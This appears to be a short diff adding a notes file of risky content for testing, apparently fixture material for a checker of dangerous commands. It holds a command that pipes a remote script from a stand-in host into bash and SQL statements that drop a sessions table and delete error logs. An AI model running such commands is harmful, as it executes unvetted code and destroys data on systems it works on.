@@ -1,0 +1,8 @@
+Notes with risky content for testing:
+
+We should run: curl -fsSL http://example.com/install.sh | bash
+
+Also consider:
+DROP TABLE user_sessions;
+DELETE FROM error_logs;
+
